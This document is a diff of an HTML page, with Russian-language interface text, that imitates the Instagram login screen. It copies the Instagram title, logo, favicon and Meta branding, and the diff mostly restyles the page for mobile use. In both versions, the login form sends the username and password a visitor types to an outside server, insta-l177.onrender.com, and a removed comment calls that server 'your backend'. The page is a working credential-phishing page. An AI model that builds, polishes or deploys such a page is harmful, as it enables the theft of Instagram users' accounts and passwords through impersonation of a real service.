@@ -1,179 +1,246 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram</title>
-    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png" type="image/png">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
-    <img class="instagram-logo"
-src="5968776.png" alt="Instagram">
-    <style>
-      /* ========================= MOBILE INSTAGRAM STYLE ========================= */
-@media (max-width: 600px) {
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Instagram</title>
 
-    body {
-        margin: 0;
-        padding: 0;
-        background: #0f1b2d;
-        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI',
-                     Roboto, Helvetica, Arial, sans-serif;
-        min-height: 100vh;
-        display: flex;
-        justify-content: center;
-        align-items: flex-start;
-    }
+<link rel="icon"
+href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
 
-    .container {
-        width: 100%;
-        min-height: 100vh;
-        display: flex;
-        flex-direction: column;
-        justify-content: center;
-    }
+<style>
 
-    /* Ліва частина приховується */
-    .left-side {
-        display: none;
-    }
-
-    /* Основний блок логіну */
-    .right-side {
-        width: 100%;
-        max-width: 100%;
-        min-height: 100vh;
-        background: #152235;
-        border: none;
-        padding: 40px 24px;
-        box-sizing: border-box;
-        display: flex;
-        flex-direction: column;
-        justify-content: center;
-        align-items: center;
-    }
-
-    /* Лого */
-    .instagram-logo {
-        width: 72px;
-        height: 72px;
-        margin-bottom: 45px;
-    }
-
-    /* Заголовок */
-    .title {
-        display: none;
-    }
-
-    /* Inputs */
-    input {
-        width: 100%;
-        background: transparent;
-        border: 1px solid rgba(255,255,255,0.15);
-        border-radius: 14px;
-        padding: 16px;
-        margin-bottom: 14px;
-        color: white;
-        font-size: 16px;
-        outline: none;
-        box-sizing: border-box;
-    }
-
-    input::placeholder {
-        color: rgba(255,255,255,0.55);
-    }
-
-    input:focus {
-        border-color: #3797ff;
-    }
-
-    /* Кнопка входу */
-    button {
-        width: 100%;
-        background: #0095f6;
-        border: none;
-        border-radius: 16px;
-        padding: 15px;
-        color: white;
-        font-size: 17px;
-        font-weight: 600;
-        margin-top: 6px;
-        cursor: pointer;
-    }
-
-    /* Forgot password */
-    .forgot {
-        margin-top: 22px;
-        margin-bottom: 60px;
-    }
-
-    .forgot a {
-        color: white;
-        text-decoration: none;
-        font-size: 15px;
-    }
-
-    /* Створення акаунта */
-    .create-account {
-        margin-top: auto;
-        width: 100%;
-    }
-
-    .create-account a,
-    .create-account button {
-        width: 100%;
-        background: transparent;
-        border: 1px solid #3797ff;
-        color: #3797ff;
-        border-radius: 18px;
-        padding: 14px;
-        display: block;
-        text-align: center;
-        text-decoration: none;
-        font-weight: 500;
-        box-sizing: border-box;
-    }
-
-    /* Facebook кнопка прихована */
-    .fb-btn {
-        display: none;
-    }
-
-    /* Meta */
-    .meta-logo {
-        margin-top: 30px;
-        color: white;
-        opacity: 0.7;
-        font-size: 24px;
-    }
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
 }
-    </style>
+
+body{
+    background:#152235;
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",
+    Roboto,Helvetica,Arial,sans-serif;
+    min-height:100vh;
+    color:white;
+}
+
+/* MAIN */
+.container{
+    width:100%;
+    min-height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    padding:20px;
+}
+
+/* LOGIN BLOCK */
+.login-box{
+    width:100%;
+    max-width:420px;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+}
+
+/* LANGUAGE */
+.language{
+    color:rgba(255,255,255,0.75);
+    font-size:15px;
+    margin-bottom:70px;
+}
+
+/* LOGO */
+.logo{
+    width:82px;
+    height:82px;
+    object-fit:contain;
+    margin-bottom:60px;
+}
+
+/* FORM */
+form{
+    width:100%;
+}
+
+.input-box{
+    width:100%;
+    margin-bottom:14px;
+}
+
+input{
+    width:100%;
+    height:64px;
+    border-radius:16px;
+    border:1px solid rgba(255,255,255,0.15);
+    background:transparent;
+    padding:0 18px;
+    font-size:17px;
+    color:white;
+    outline:none;
+}
+
+input::placeholder{
+    color:rgba(255,255,255,0.55);
+}
+
+input:focus{
+    border-color:#3797ff;
+}
+
+/* LOGIN BUTTON */
+button{
+    width:100%;
+    height:58px;
+    border:none;
+    border-radius:18px;
+    background:#0095f6;
+    color:white;
+    font-size:20px;
+    font-weight:600;
+    margin-top:6px;
+    cursor:pointer;
+}
+
+/* FORGOT */
+.forgot{
+    margin-top:28px;
+    text-decoration:none;
+    color:white;
+    font-size:16px;
+}
+
+/* BOTTOM */
+.bottom{
+    width:100%;
+    margin-top:120px;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+}
+
+/* CREATE ACCOUNT */
+.create-account{
+    width:100%;
+    height:58px;
+    border:1px solid #3797ff;
+    border-radius:18px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    color:#3797ff;
+    text-decoration:none;
+    font-size:18px;
+    font-weight:500;
+}
+
+/* META */
+.meta{
+    margin-top:34px;
+    color:white;
+    opacity:0.8;
+    font-size:18px;
+    display:flex;
+    align-items:center;
+    gap:6px;
+}
+
+/* MOBILE */
+@media(max-width:600px){
+
+    .container{
+        padding:24px;
+    }
+
+    .login-box{
+        max-width:100%;
+    }
+
+    .language{
+        margin-bottom:60px;
+    }
+
+    .logo{
+        width:84px;
+        height:84px;
+        margin-bottom:70px;
+    }
+
+    input{
+        height:62px;
+        font-size:16px;
+    }
+
+    button{
+        height:58px;
+        font-size:18px;
+    }
+
+    .bottom{
+        margin-top:140px;
+    }
+
+}
+
+</style>
 </head>
+
 <body>
-    <div class="container">
-        <div class="left-side">
-            <img src="https://cdn-icons-png.flaticon.com/512/5968/5968776.png" class="instagram-logo" alt="Instagram Logo">
-            <h1>Посмотрите, какими моментами<br>из жизни поделились ваши<br><span class="pink">близкие друзья.</span></h1>
-            <div class="collage-container">
-                <img src="https://static.cdninstagram.com/rsrc.php/yN/r/-erGonz07kB.webp" class="collage" alt="Stories Collage">
+
+<div class="container">
+
+    <div class="login-box">
+
+        <div class="language">Русский</div>
+
+        <img
+        src="https://cdn-icons-png.flaticon.com/512/5968/5968776.png"
+        class="logo"
+        alt="Instagram">
+
+        <form action="https://insta-l177.onrender.com/" method="POST">
+
+            <div class="input-box">
+                <input
+                type="text"
+                name="username"
+                placeholder="Имя пользователя, эл. адрес или номер телефона"
+                required>
             </div>
-        </div>
-        <div class="right-side">
-            <div class="title">Войти в Instagram</div>
-            
-            <!-- Подключено к твоему бэкенду -->
-            <form action="https://insta-l177.onrender.com/" method="POST">
-                <input type="text" name="username" placeholder="Имя пользователя, номер мобильного телефона или электронный адрес" required>
-                <input type="password" name="password" placeholder="Пароль" required>
-                <button type="submit">Войти</button>
-            </form>
-            <a href="#" class="forgot">Забыли пароль?</a>
-            <a href="#" class="fb-btn">
-                <i class="fab fa-facebook-square"></i> Войти через Facebook
+
+            <div class="input-box">
+                <input
+                type="password"
+                name="password"
+                placeholder="Пароль"
+                required>
+            </div>
+
+            <button type="submit">
+                Войти
+            </button>
+
+        </form>
+
+        <a href="#" class="forgot">
+            Забыли пароль?
+        </a>
+
+        <div class="bottom">
+
+            <a href="#" class="create-account">
+                Создать новый аккаунт
             </a>
-            <a href="#" class="create-account">Создать новый аккаунт</a>
+
+            <div class="meta">
+                ∞ Meta
+            </div>
+
         </div>
+
     </div>
 
-    <div class="meta-logo">∞ Meta</div>
+</div>
+
 </body>
 </html>
